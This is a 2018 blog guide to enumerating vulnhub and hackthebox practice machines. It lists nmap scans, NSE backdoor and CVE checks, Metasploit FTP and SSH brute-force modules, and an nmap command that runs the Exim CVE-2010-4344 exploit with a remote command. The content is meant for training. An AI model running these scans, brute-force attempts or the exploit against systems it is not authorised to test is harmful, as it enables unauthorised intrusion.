---
title:  "Enumeration"
excerpt: "Enumerate, enumerate, enumerate... words you will be hearing often. It really is key to finding
those tricky and hard exploits. Don't just stop at the common ports, you will need to keep looking. In this
post we take a look at some common methods of enumeration during penetration testing a host machine"
author: Ben Wilson
date: 2018-12-08
madeupdate: 2018-12-08
classes: wide
tags:
  - guide
toc: true
---

# Enumeration
Enumeration, a key first step into finding out all the information you can from a target.
In this article, I will discuss targeting a vulnerable host, ones found on sites like
[vulnhub.com](https://www.vulnhub.com) or [hackthebox.eu](https://www.hackthebox.eu).

## 1. Target IP
You need to know what you are targeting. If you have membership to <b>hackthebox</b> then you know
the IP address you need to target. If it is a **vulnhub** machine, you will need to tweak the settings
in your virtual machine manager to obtain that IP address. If you use **hackthebox**, then try pinging
 the machine to see if it responds. With **vulnhub**, do a nmap scan on the same network as the 
 machine to find its IP address.

## 2. Ports, ports, ports...
After the IP address, its time to target the machine. We need to know what ports are open to target.
Using NMAP, you can find these ports. This is the go to tool for this job. For general information,
you can use [https://highon.coffee/blog/nmap-cheat-sheet/](https://highon.coffee/blog/nmap-cheat-sheet/) to help you understand
the commands that are used or look below for more basic command line options.

### 2.1 Getting basic ports
One of the first things I like to do is just get some basic ports back.
A lot of the machines you will be facing will have those common ports open.
With NMAP, we can quickly scan for these ports and see what targets we can enumerate more
while we wait for a more in depth scan to gather more intel.
```bash
nmap -F -oA /path/to/output/results 192.168.1.1
```

### 2.2 In Depth NMAP scans
Once the fast NMAP scan is complete, we can move along to the scans which may take anywhere from 
5 minutes to hours to finish, depending on the settings you choose in NMAP. These in depth scans will help 
us find any low hanging fruit to to target and find those unique ports not covered in the first 1024.
We need to do both TCP and UDP coverage.
```bash
# TCP
nmap -v -p- -sS -T4 -A -oA /path/to/output/results 192.168.1.1
# UDP
nmap -v -p- -sU -T4 -A -oA /path/to/output/results 192.168.1.1
```

## 3. Enumerate, enumerate, enumerate...
Next, it is time to enumerate. With a basic list of ports from the fast nmap scan, you will need to target
those ports with further automated and manual scans. Remember, any port can host any service, but 
usually you the more common ports will always host what you think. Take a look below for some 
common tools for common ports

### 3.1 Port 21 (FTP)

Basic issues arise from FTP with vulnerable versions, anonymous ftp, weak credentials and more.
Below are some commands you can run to see if this holds true:

```bash
# NMAP
# Basic scan that also checks Anonymous FTP
nmap -sV -sC 1.1.1.1
# scripts (Bounce, VSFTPD backdoor, cve2010-4221, brute, proftpd-backdoor)
nmap -sV -sC -p 21 --script=ftp-bounce 192.168.1.1
nmap -p 21 --script=ftp-proftpd-backdoor 192.168.1.1
nmap -p 21 --script=ftp-vsftpd-backdoor 192.168.1.1
nmap -p 21 --script=ftp-vuln-cve2010-4221 192.168.1.1
nmap -p 21 --script=ftp-brute 192.168.1.1
# Metasploit
# Anonymous login
use auxiliary/scanner/ftp/anonymous
msf auxiliary(anonymous) > set rhosts 192.168.1.1
msf auxiliary(anonymous) > exploit
# FTP Banner Grab
use auxiliary/scanner/ftp/ftp_version
set rhosts 1.1.1.1
exploit
# FTP Brute Force
use auxiliary/scanner/ftp/ftp_login
set rhosts 192.168.1.1
set user_file /path/to/usernames.txt
set pass_file /path/to/passwords.txt
set stop_on_success true
exploit
```
* Links
  * https://www.hackingarticles.in/ftp-penetration-testing-in-ubuntu-port-21/
  
### 3.2 Port 22 (SSH)
Common issues are weak credentials and vulnerable versions. See below for some scripts.
```bash
# NMAP
# Banner grabbing (NMAP)
nmap -sV -p 22 192.168.1.1
# scripts (ssh_hostkey, ssh_hostkey_all, ssh_hostkey_visual_bubble, ssh2_enum_algos, sshv1)
nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full
nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=all
nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey='visual bubble'
nmap --script ssh2-enum-algos 192.168.1.1
nmap -sV -sC --script=sshv1 192.168.1.1
# Metasploit
# Brute Force
use auxiliary/scanner/ssh/ssh_login
set rhost 192.168.1.1
set rport 22
set userpass_file /path/to/usernam_and_passwords.txt
exploit
```

### 3.3 Port 25 - SMTP
```bash
# NMAP
# Banner Grabbing
nmap -sV -p 25 192.168.1.1
# scripts (smtp-enum-users, smtp-strangeport, smtp-vuln-cve2010-4344 - P1, smtp-vuln-cve2010-4344 - P2,  smtp-vuln-cve2011-1764)
nmap --script smtp-enum-users [--script-args smtp-enum-users.methods={EXPN,...},...] -p 25,465,587 192.168.1.1
nmap -sV --script=smtp-strangeport 192.168.1.1
# Two part series below, part 2 needs part 1 to work.
## part 1
nmap --script=smtp-vuln-cve2010-4344 --script-args=\"smtp-vuln-cve2010-4344.exploit\" -pT:25,465,587 192.168.1.1
## part 2
nmap --script=smtp-vuln-cve2010-4344 --script-args=\"exploit.cmd='uname -a'\" -pT:25,465,587 192.168.1.1
#cve2011-1764
nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 

```

## 4. Try harder...
The OSCP moto, try harder. Once you have enumerated it is time to test these services for exploits.
You will run into brick wall after brick wall, but you can't give up. You need to try harder
and get past that wall. If you get stuck on one port (like HTTP), then move along and try another port.
You can always come back to try again. If you believe you don't have enough information, you need to try
again and enumerate. LIke step #3 stays, enumerate enumerate enumerate. 

## 5. Exploit
Hopefully by now you have found your exploit, you way in. Whether or not that gives you root or 
low level user is another issue! If you have not found your way in, or are stuck, look below for some hints

# Hints
* You may need to enumerate more. Did you run nikto, dirbuster on a http port? Did you leave it run
for more than 5 minutes? Did you let NMAP finish what it was doing? Have you tried brute forcing the FTP
login with default credentials?
* If you do not know a service, google it. Google will be your best friend when pen testing boxes from 
vulnhub or hackthebox. Google the HTTP server, google the version of PHP its running. You can combine
your searches with exploit to see if anything pings up. The answers will be out there.
* If you really get stuck, check the forums at hackthebox or ask for help with vulnhub. 
Try your best to not get a walkthrough for either site, it will defeat the purpose of your learning.
* Find a mentor or buddy to help you on your way. Often, you will find yourself deflated and defeated after
hours of enumeration and no shell. IF you have exhusted Google, tried all the techniques you know
to enumerate then reach out to a mentor or buddy. They may give you 


Cheers,
Ben.








